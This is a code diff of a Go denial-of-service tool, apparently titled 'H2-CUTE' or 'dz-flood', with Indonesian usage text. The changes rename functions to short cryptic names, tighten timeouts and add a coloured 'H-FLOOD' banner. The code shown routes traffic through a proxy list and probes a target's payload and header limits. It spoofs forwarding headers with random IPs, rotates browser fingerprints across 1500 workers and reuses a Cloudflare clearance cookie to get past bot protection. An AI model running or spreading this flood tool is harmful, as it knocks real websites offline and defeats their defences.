@@ -22,13 +22,24 @@ import (
 )
 
 const (
-	wrk        = 1500
-	to         = 6 * time.Second
-	sub        = 5
-	KEEP_ALIVE = 30 * time.Second
+	Reset       = "\033[0m"
+	Red         = "\033[31m"
+	White       = "\033[37m"
+	RedBright   = "\033[91m"
+	RedLight    = "\033[38;5;203m"
+	RedPink     = "\033[38;5;204m"
+	LightPink   = "\033[38;5;218m"
+	WhiteBright = "\033[97m"
 )
 
-type BrowserProfile struct {
+const (
+	wrk = 1500
+	to  = 6 * time.Second
+	sub = 5
+	KEP = 30 * time.Second
+)
+
+type BPF struct {
 	UA          string
 	Accept      string
 	Lang        string
@@ -38,7 +49,7 @@ type BrowserProfile struct {
 	SecChUaPlat string
 }
 
-var profiles = []BrowserProfile{
+var PFS = []BPF{
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
 		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -156,9 +167,9 @@ func RST(rng *rand.Rand, length int) string {
 var customCookie string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 
-func probeMaxPayloadSize(target string) int {
+func PMP(target string) int {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: 7 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -190,9 +201,9 @@ func probeMaxPayloadSize(target string) int {
 	return lastSuccess
 }
 
-func probeMaxHeaderSize(target string) int {
+func PMH(target string) int {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: 7 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -219,9 +230,9 @@ func probeMaxHeaderSize(target string) int {
 	return lastSuccess
 }
 
-func probeHeaders(target string, proxyIP string) map[string]bool {
+func PHR(target string, proxyIP string) map[string]bool {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: 7 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -233,7 +244,6 @@ func probeHeaders(target string, proxyIP string) map[string]bool {
 		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 	}
-
 	headerList := []string{
 		"X-Original-URL",
 		"X-Forwarded-Host",
@@ -280,8 +290,8 @@ func probeHeaders(target string, proxyIP string) map[string]bool {
 
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
-		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
+		fmt.Println("Cara pakai: H2-CUTE.go <target> <duration> <cookie>")
+		fmt.Println("Contoh: H2-CUTE.go https://target.com 60 \"cf_clearance=xxx\"")
 		os.Exit(1)
 	}
 	tgt := os.Args[1]
@@ -298,7 +308,7 @@ func main() {
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
 
-	var proxies []*url.URL
+	var PRX []*url.URL
 	file, err := os.Open("proxy.txt")
 	if err == nil {
 		defer file.Close()
@@ -312,35 +322,35 @@ func main() {
 				line = "http://" + line
 			}
 			if p, err := url.Parse(line); err == nil {
-				proxies = append(proxies, p)
+				PRX = append(PRX, p)
 			}
 		}
 	}
-	if len(proxies) == 0 {
-		proxies = append(proxies, nil)
+	if len(PRX) == 0 {
+		PRX = append(PRX, nil)
 	}
 
 	var proxyIP string
-	if len(proxies) > 0 && proxies[0] != nil {
-		proxyIP = proxies[0].Hostname()
+	if len(PRX) > 0 && PRX[0] != nil {
+		proxyIP = PRX[0].Hostname()
 	}
 
-	maxPayload := probeMaxPayloadSize(tgt)
-	maxHeader := probeMaxHeaderSize(tgt)
-	headerSupport := probeHeaders(tgt, proxyIP)
+	maxPayload := PMP(tgt)
+	maxHeader := PMH(tgt)
+	headerSupport := PHR(tgt, proxyIP)
 
-	wcs := make([]CLI, len(proxies))
-	for i, proxyURL := range proxies {
+	wcs := make([]CLI, len(PRX))
+	for i, proxyURL := range PRX {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
-				Timeout:   5 * time.Second,
-				KeepAlive: KEEP_ALIVE,
+				Timeout:   4 * time.Second,
+				KeepAlive: KEP,
 			}).DialContext,
 			DisableKeepAlives:      false,
 			MaxIdleConns:           50000,
 			MaxIdleConnsPerHost:    50000,
 			MaxConnsPerHost:        0,
-			IdleConnTimeout:        KEEP_ALIVE,
+			IdleConnTimeout:        KEP,
 			TLSClientConfig: &tls.Config{
 				InsecureSkipVerify: true,
 				MinVersion:         tls.VersionTLS12,
@@ -357,9 +367,9 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   5 * time.Second,
-			ResponseHeaderTimeout: 5 * time.Second,
-			ExpectContinueTimeout: 1 * time.Second,
+			TLSHandshakeTimeout:   4 * time.Second,
+			ResponseHeaderTimeout: 4 * time.Second,
+			ExpectContinueTimeout: 0 * time.Second,
 		}
 		ip := ""
 		if proxyURL != nil {
@@ -375,19 +385,38 @@ func main() {
 		wcs[i] = CLI{client: client, ip: ip}
 	}
 
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
-	fmt.Printf("ޗ | Ulimit : 1048576\n")
-	fmt.Printf("ޗ | Target : %s\n", tgt)
-	fmt.Printf("ޗ | Time   : %d s\n", dur)
-	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d\n", wrk)
-	if customCookie != "" {
-		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
-	} else {
-		fmt.Printf("ޗ | Cookie : False\n")
+	fmt.Printf("%s", WhiteBright)
+	fmt.Println(":::::::-.  :::::::::      .,~:::::    .:::.")
+	fmt.Printf("%s", LightPink)
+	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
+	fmt.Printf("%s", RedPink)
+	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
+	fmt.Printf("%s", RedLight)
+	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
+	fmt.Printf("%s", Red)
+	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
+	fmt.Printf("%s", RedBright)
+	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
+	fmt.Printf("%s", Reset)
+
+	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)
+
+	printInfo := func(label, value string) {
+		fmt.Printf("%s%s%s %s:%s %s%s%s\n", White, label, Reset, Red, Reset, White, value, Reset)
 	}
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
+	printInfo("Method", "H-FLOOD")
+	printInfo("Ulimit", "1048576")
+	printInfo("Target", tgt)
+	printInfo("Time  ", fmt.Sprintf("%d/s", dur))
+	printInfo("Proxy ", fmt.Sprintf("%d", len(PRX)))
+	printInfo("Worker", fmt.Sprintf("%d", wrk))
+	if customCookie != "" {
+		printInfo("Cookie", customCookie[:30])
+	} else {
+		printInfo("Cookie", "False")
+	}
+
+	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n\n", Red, Reset)
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
@@ -413,7 +442,7 @@ func main() {
 					subRng := rand.New(rand.NewSource(rng.Int63()))
 
 					for ctx.Err() == nil {
-						prof := profiles[subRng.Intn(len(profiles))]
+						prof := PFS[subRng.Intn(len(PFS))]
 
 						reqURL := tgt
 
